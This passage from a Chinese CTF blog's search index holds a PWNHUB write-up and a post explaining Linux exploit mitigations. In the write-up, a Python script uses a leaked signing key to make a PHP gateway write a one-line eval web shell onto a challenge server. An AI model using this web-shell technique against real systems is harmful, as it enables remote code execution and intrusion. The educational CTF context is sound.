class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php   <br>require_once(<span class="hljs-string">&quot;interface.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;utils.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;HeroFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleNetServices.php&quot;</span>);<br>define(<span class="hljs-string">&quot;BATTLE_NET_KEY&quot;</span>,<span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span>);<br><span class="hljs-keyword">if</span> (!defined(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>)) &#123;<span class="hljs-keyword">if</span> (substr(PHP_OS, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) == <span class="hljs-string">&#x27;WIN&#x27;</span>) define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>); <span class="hljs-keyword">else</span> define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>);&#125; <br>ini_set(<span class="hljs-string">&#x27;include_path&#x27;</span>,ini_get(<span class="hljs-string">&#x27;include_path&#x27;</span>).PATH_SEPARATOR.realpath(<span class="hljs-string">&quot;../&quot;</span>));     <br><br>$param=$_POST;<br><span class="hljs-keyword">if</span>(empty($param))$param=$_GET;      <br>$from_uid=$param[<span class="hljs-string">&quot;from_uid&quot;</span>];   <br>$sign=$param[<span class="hljs-string">&quot;sign&quot;</span>];<br>$commandFunc=$param[<span class="hljs-string">&quot;commandFunc&quot;</span>];<br>$content=urldecode($param[<span class="hljs-string">&quot;content&quot;</span>]);<br>$content_encoding=$param[<span class="hljs-string">&quot;content-encoding&quot;</span>];<br>//$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY;<br><br><br><br>$ret=array();<br><span class="hljs-keyword">if</span>($sign!=md5($from_uid.$commandFunc.$content.BATTLE_NET_KEY)) <br>$ret[]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">else</span>&#123;<br>    $ret[]=<span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br>$inputParams=explode(<span class="hljs-string">&quot;|&quot;</span>,$content);<br><span class="hljs-keyword">if</span>(count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=$inputParams[<span class="hljs-number">0</span>];<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    $inputParams=json_decode($content,true);<br><span class="hljs-keyword">if</span>(is_array($inputParams)&amp;&amp;count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=array_shift($inputParams);<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams); <br>&#125;<br>&#125;catch(Exception $e)&#123;<br>    $ret = array(<span class="hljs-number">0</span>=&gt;<span class="hljs-number">0</span>);<br>$ret[] = $e-&gt;getMessage();<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br><span class="hljs-built_in">print</span> implode(<span class="hljs-string">&quot;|&quot;</span>,$ret);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-built_in">print</span> json_encode($ret);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>看到密钥</p><p><code>define(&quot;BATTLE_NET_KEY&quot;,&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;);</code><br>上传一个木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> sys<br><br>BATTLE_NET_KEY = <span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span> //key<br>data = &#123;<br>    <span class="hljs-string">&quot;from_uid&quot;</span>: <span class="hljs-string">&quot;a.php&quot;</span>,<br>    <span class="hljs-string">&quot;commandFunc&quot;</span>: <span class="hljs-string">&quot;file_put_contents&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&#x27;&lt;? eval($_POST[&#x27;</span>a<span class="hljs-string">&#x27;]);&#x27;</span>,  //一句话<br>    <span class="hljs-string">&quot;content-encoding&quot;</span>: <span class="hljs-string">&quot;csv&quot;</span><br>&#125;<br>data[<span class="hljs-string">&quot;sign&quot;</span>] = hashlib.md5((data[<span class="hljs-string">&quot;from_uid&quot;</span>]+data[<span class="hljs-string">&quot;commandFunc&quot;</span>]+data[<span class="hljs-string">&quot;content&quot;</span>]+BATTLE_NET_KEY).encode()).hexdigest()<br>t=requests.post(<span class="hljs-string">&quot;http://120.55.42.64:81/server/game/BattleNetGateway.php&quot;</span>, data=data)<br><span class="hljs-built_in">print</span>(t.text)<br></code></pre></td></tr></table></figure><p>蚁剑连接，flag在根目录下<br><img src="/mdimg/2022PWNHUB/5.jpeg"></p><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="Tcp-Show"><a href="#Tcp-Show" class="headerlink" title="Tcp Show"></a>Tcp Show</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><br>n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    d, rawdata = <span class="hljs-built_in">input</span>().strip().split()<br>    data = base64.b64decode(rawdata.encode())<br>    now = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">8</span><br>        now += <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) + <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                now += <span class="hljs-built_in">hex</span>(data[i + j])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">3</span><br>        now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                tmp = data[i + j]<br>                <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= tmp &lt;= <span class="hljs-number">126</span>:<br>                    now += <span class="hljs-built_in">chr</span>(tmp)<br>                <span class="hljs-keyword">else</span>:<br>                    now += <span class="hljs-string">&#x27;.&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>        now += <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-built_in">print</span>(now[:-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="垃圾邮件分析"><a href="#垃圾邮件分析" class="headerlink" title="垃圾邮件分析"></a>垃圾邮件分析</h2><p>爆破sha256脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-string">&#x27;sha256(vKyd2tRZFtkExhiNlPlVTduEqY47 + xxxx) = 4a39288b21b34650b177bdc58c416b3f55305945a9cf87f4bd7b4da2569c10e4&#x27;</span><br>suffix = data.split(<span class="hljs-string">&quot;(&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot; +&quot;</span>)[<span class="hljs-number">0</span>]<br>digest = data.split(<span class="hljs-string">&quot;= &quot;</span>)[<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA256<br><span class="hljs-keyword">import</span> itertools<br><br>ALPHABET = string.ascii_letters + string.digits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getProof</span>(<span class="hljs-params">suffix,digest</span>):   <br><br>    <span class="hljs-comment">#print(f&quot;suffix: &#123;suffix&#125;\ndigest: &#123;digest&#125;&quot;)</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(ALPHABET,repeat=<span class="hljs-number">4</span>):<br>        prefix = <span class="hljs-string">&#x27;&#x27;</span>.join(i)<br>        guess =  suffix + prefix<br>        <span class="hljs-keyword">if</span> sha256(guess.encode()).hexdigest() == digest:<br>            <span class="hljs-comment">#print(f&quot;Find X<span class="hljs-doctag">XXX:</span> &#123;prefix&#125;&quot;)</span><br>            <span class="hljs-keyword">return</span> prefix<br>            <span class="hljs-keyword">break</span><br><br>x = getProof(suffix,digest)<br><span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure><p>给50条数据来训练AI，然后给10条邮件让判断是垃圾邮件还是好的邮件<br>不会机器学习，纯靠翻译自己去判断，10条全对就拿到flag了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux保护机制</title>
    <link href="/2023/02/04/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DLinux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/02/04/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DLinux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>数据不可执行。原理是将数据所在内存页标识为不可执行，防止因为程序运行出现溢出而使得攻击者的shellcode可能会在数据区尝试执行的情况。NX在咱屡战屡败的经典栈溢出实验中有接触过，NX是对栈和堆的一种保护机制。实验需要关闭NX和地址随机化，否则执行shellcode时，CPU就会抛出异常，而不是去执行恶意指令。<br>Linux系统叫做NX，Windows系统中类似的机制叫DEP(Data Execute Prevention)。</p><h2 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h2><p>栈保护。栈溢出保护是一种缓冲区溢出攻击缓解手段。启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。<br>简单来说就是通过验证cookie，来判断执行的代码是不是恶意代码。</p><h2 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE / ASLR"></a>PIE / ASLR</h2><p>地址随机化。就是保证同一个程序任意两次运行时的堆栈基址是不同的。如果堆栈基址不变会怎样？不变就可能被攻击，因为攻击者能确认程序的内存地址，然后通过覆盖返回地址在等手段执行恶意代码。咱屡战屡败的经典栈溢出实验就是通过覆盖返回地址执行恶意代码。</p><table><thead><tr><th></th><th>随机化段</th><th>设置</th></tr></thead><tbody><tr><td>ADLR</td><td>堆、栈、mmap（libc库）、VDSO page</td><td>由操作系统设置</td></tr><tr><td>PIE</td><td>数据段、代码段</td><td>由编译器设置</td></tr></tbody></table><h2 id="Relro"><a href="#Relro" class="headerlink" title="Relro"></a>Relro</h2><p>只读重定位。设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT攻击。在Linux中有”Partial RELRO” “Full RELRO”两种模式，默认开启Partical RELRO，开启Partical RELRO时，GOT是可写的，开启 FULL RELRO 时，GOT表是只读的。<br> 主要用来保护重定位表段对应数据区域，默认可写 </p><ol><li>Partial RELRO： got表不可写，got.plt可写 </li><li>Full RELRO： got表，got.plt不可写  </li></ol><p>部分RELRO 易受到攻击，例如攻击者可以<strong>atoi.got为system.plt，进而输入/bin/sh\x00获得shell</strong><br>完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。<br>参考：</p><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>在编译的时候检查源码是否存在缓冲区溢出等错误。<br>简单地说，加了这个保护之后,一些敏感函数如read, fgets,memcpy, printf等等可能导致漏洞出现的函数都会被替换成__read_chk,__fgets_chk, __memcpy_chk, __printf_chk等。<br>这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，通过检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。</p><h2 id="BRATH"><a href="#BRATH" class="headerlink" title="BRATH"></a>BRATH</h2><p>程序运行时的环境变量，运行时所需要的共享库文件优先从该目录寻找，可以fake lib造成攻击。</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
